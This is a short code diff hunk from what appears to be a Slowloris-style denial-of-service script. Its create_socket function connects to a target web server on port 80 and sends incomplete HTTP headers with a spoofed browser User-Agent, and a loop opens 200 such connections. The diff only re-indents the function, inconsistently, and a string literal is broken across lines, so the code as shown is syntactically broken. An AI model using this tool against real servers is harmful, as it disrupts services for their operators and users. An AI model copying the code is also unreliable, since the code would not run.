@@ -75,15 +75,15 @@ target_port = 80
 connections = []
 
 def create_socket():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(4)
-    s.connect((target_ip, target_port))
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
-    (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n".encode("utf-8"))
-    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
-    return s
-    
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.settimeout(4)
+  s.connect((target_ip, target_port))
+  s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+  s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
+  (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n".encode("utf-8"))
+   s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
+   return s
+
 
 for _ in range(200):
     try:
